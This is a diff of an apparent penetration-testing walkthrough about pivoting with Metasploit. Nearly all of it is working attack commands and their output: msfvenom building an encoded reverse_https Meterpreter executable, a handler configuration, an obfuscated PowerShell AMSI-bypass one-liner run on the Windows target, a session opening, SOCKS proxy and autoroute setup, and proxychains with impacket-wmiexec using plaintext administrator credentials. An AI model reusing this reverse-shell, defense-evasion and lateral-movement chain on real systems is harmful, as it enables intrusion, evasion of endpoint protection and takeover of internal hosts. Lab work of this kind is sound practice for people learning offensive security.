@@ -35,63 +35,40 @@ Email Address []:
 jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ cat pentest.key pentest.crt > pentest.pem
 
 
-2 - Generate an encrypted meterpreter ("windows/meterpreter/reverse_https" OR "windows/meterpreter/reverse_winhttps")
+2 - Generate an encrypted meterpreter (windows/meterpreter/reverse_https)
 ----------------------------------------------------------------------------------------------------------------------
 
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps1.exe
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.56.104 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/bf_xor
-x86/bf_xor succeeded with size 904 (iteration=0)
-x86/bf_xor chosen with final size 904
-Payload size: 904 bytes
+x86/bf_xor succeeded with size 877 (iteration=0)
+x86/bf_xor chosen with final size 877
+Payload size: 877 bytes
 Final size of exe-only file: 73802 bytes
-Saved as: reversehttps1.exe
-
-OR
-
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ msfvenom -p windows/meterpreter/reverse_winhttps EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps2.exe
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-Found 1 compatible encoders
-Attempting to encode payload with 1 iterations of x86/bf_xor
-x86/bf_xor succeeded with size 1061 (iteration=0)
-x86/bf_xor chosen with final size 1061
-Payload size: 1061 bytes
-Final size of exe-only file: 73802 bytes
-Saved as: reversehttps2.exe
+Saved as: reversehttps.exe
 
 
 3 - Set up and launch a Meterpreter handler (windows/meterpreter/reverse_https)
 -----------------------------------------------------------------------------------------
 
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.1.30; set LPO
-RT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; set HandlerSSLCert /h
-ome/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
+jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST 192.168.56.104; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; set SessionCommunicationTimeout 0; set EnableStageEncoding true; set EnableUnicodeEncoding true; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
+[sudo] password for jeff:
 [!] The following modules were loaded with warnings:
 [!]     /usr/share/metasploit-framework/modules/encoders/x86/bf_xor.rb
 [!] Please see /root/.msf4/logs/framework.log for details.
 
-  +-------------------------------------------------------+
-  |  METASPLOIT by Rapid7                                 |
-  +---------------------------+---------------------------+
-  |      __________________   |                           |
-  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
-  |             )=\           | |  EXPLOIT   \            |
-  |            // \\          | |_____________\_______    |
-  |           //   \\         | |==[msf >]============\   |
-  |          //     \\        | |______________________\  |
-  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
-  |        //         \\      |  *********************    |
-  +---------------------------+---------------------------+
-  |      o O o                |        \'\/\/\/'/         |
-  |              o O          |         )======(          |
-  |                 o         |       .'  LOOT  '.        |
-  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
-  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
-  | |________________|__|)__| |    |     __||_)     |     |
-  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
-  |  = = = = = = = = = = = =  |     '--------------'      |
-  +---------------------------+---------------------------+
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 
 
        =[ metasploit v6.1.14-dev                          ]
@@ -99,12 +76,13 @@ ome/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; run -j"
 + -- --=[ 596 payloads - 46 encoders - 10 nops            ]
 + -- --=[ 9 evasion                                       ]
 
-Metasploit tip: Enable HTTP request and response logging
-with set HttpTrace true
+Metasploit tip: After running db_nmap, be sure to
+check out the result of hosts and services
 
+[*] Starting persistent handler(s)...
 [*] Using configured payload generic/shell_reverse_tcp
 PAYLOAD => windows/meterpreter/reverse_https
-LHOST => 192.168.1.30
+LHOST => 192.168.56.104
 LPORT => 443
 EXITFUNC => thread
 ExitOnSession => false
@@ -115,7 +93,7 @@ HandlerSSLCert => /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem
 [*] Exploit running as background job 0.
 [*] Exploit completed, but no session was created.
 
-[*] Started HTTPS reverse handler on https://192.168.1.30:443
+[*] Started HTTPS reverse handler on https://192.168.56.104:443
 
 
 ===========================================================================================================================================
@@ -136,42 +114,38 @@ Try the new cross-platform PowerShell https://aka.ms/pscore6
 PS C:\Users\Administrator.PO718687> sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;
 PS C:\Users\Administrator.PO718687> (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 PS C:\Users\Administrator.PO718687> cd .\Documents\Tools-AD\
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps1.exe
+PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps.exe
 PS C:\Users\Administrator.PO718687\Documents\Tools-AD>
-PS C:\Users\Administrator.PO718687\Documents\Tools-AD> .\reversehttps2.exe
-
 
 
 =====================================================================================================================================================
 Step 3 - Configure the meterpreter handler (C2 server) to pivot into the internal network of the Windows target using a proxy socks5 and Proxychains
 =====================================================================================================================================================
 
+[*] Started HTTPS reverse handler on https://192.168.56.104:443
 msf6 exploit(multi/handler) > sessions -i
 
 Active sessions
 ===============
-
 No active sessions.
 
-msf6 exploit(multi/handler) >
-[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Without a database connected that payload UUID tracking will not work!
-[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Encoded stage with x86/shikata_ga_nai
-[*] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Staging x86 payload (176249 bytes) ...
-[!] https://192.168.1.30:443 handling request from 192.168.1.113; (UUID: 26lugeb3) Without a database connected that payload UUID tracking will not work!
-[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2022-11-01 17:29:15 +0100
+msf6 exploit(multi/handler) > 
+[!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Encoded stage with x86/shikata_ga_nai
+[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Staging x86 payload (176249 bytes) ...
+[!] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: qghkh4ur) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2022-11-01 18:34:12 +0100
 
-msf6 exploit(multi/handler) > sessions -i
+sessions -i
 
 Active sessions
 ===============
 
   Id  Name  Type                     Information                        Connection
   --  ----  ----                     -----------                        ----------
-  1         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
-  2         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.1.30:443 -> 127.0.0.1  (192.168.1.113)
-
-msf6 exploit(multi/handler) >
-
+  1         meterpreter x86/windows  PO718687\Administrator @ PO718687  192.168.56.104:443 -> 127.0.0.1  (192.168.1.113)
+  
+  
 msf6 exploit(multi/handler) > use auxiliary/server/socks_proxy
 
 msf6 auxiliary(server/socks_proxy) > show options
@@ -188,14 +162,28 @@ Module options (auxiliary/server/socks_proxy):
 
 
 Auxiliary action:
+
    Name   Description
    ----   -----------
    Proxy  Run a SOCKS proxy server
 
-
 msf6 auxiliary(server/socks_proxy) > run
-[*] Auxiliary module running as background job 3.
+[*] Auxiliary module running as background job 1.
 [*] Starting the SOCKS proxy server
+
+
+msf6 auxiliary(server/socks_proxy) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > run autoroute -s 192.168.1.0 -n 255.255.255.0
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 192.168.1.0/255.255.255.0...
+[+] Added route to 192.168.1.0/255.255.255.0 via 192.168.56.1
+[*] Use the -p option to list all active routes
+meterpreter > background
+[*] Backgrounding session 1...
 
 ------------------------------------------------------------------
 Notes
@@ -303,50 +291,11 @@ Jobs
 Step 4 - Use Proxychains on your attack server (e.g. Kali VM) and the tunnel established with meterprter to pivot into the internal network
 ============================================================================================================================================
 
-Example 1 - Nmap port scans of internal servers over the meterpreter tunnel
---------------------------------------------------------------------------------
-
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF$ proxychains nmap -sT -n -p 80,443 192.168.1.254
-[*] exec: proxychains nmap -sT -n -p 80,443 192.168.1.254
-
-ProxyChains-3.1 (http://proxychains.sf.net)
-Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-01 17:53 CET
-|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:443-<><>-OK
-|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.254:80-<><>-OK
-Nmap scan report for 192.168.1.254
-Host is up (0.027s latency).
-
-PORT    STATE SERVICE
-80/tcp  open  http
-443/tcp open  https
-MAC Address: 68:A3:78:8B:0C:DD (Freebox SAS)
-
-Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds
-
-
-msf6 auxiliary(server/socks_proxy) > proxychains nmap -sT -n -p 3389,445 192.168.1.196
-[*] exec: proxychains nmap -sT -n -p 3389,445 192.168.1.196
-
-ProxyChains-3.1 (http://proxychains.sf.net)
-Starting Nmap 7.91 ( https://nmap.org ) at 2022-11-01 17:54 CET
-|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:3389-<><>-OK
-|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.196:445-<><>-OK
-Nmap scan report for 192.168.1.196
-Host is up (0.0055s latency).
-
-PORT     STATE SERVICE
-445/tcp  open  microsoft-ds
-3389/tcp open  ms-wbt-server
-MAC Address: 08:00:27:36:26:0A (Oracle VirtualBox virtual NIC)
-
-Nmap done: 1 IP address (1 host up) scanned in 0.15 seconds
-
-
-Example 2 - wmiexec (impacket) connection to an internal server over the meterpreter tunnel
+Example 1 - wmiexec (impacket) connection to an internal server over the meterpreter tunnel
 --------------------------------------------------------------------------------------------
 
-msf6 auxiliary(server/socks_proxy) > proxychains impacket-wmiexec administrator:Jesuisunepetitepistache2022@192.168.1.196
-[*] exec: proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
+msf6 auxiliary(server/socks_proxy) >  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
+[*] exec:  proxychains impacket-wmiexec administrator:Superpass2022@192.168.1.196
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation
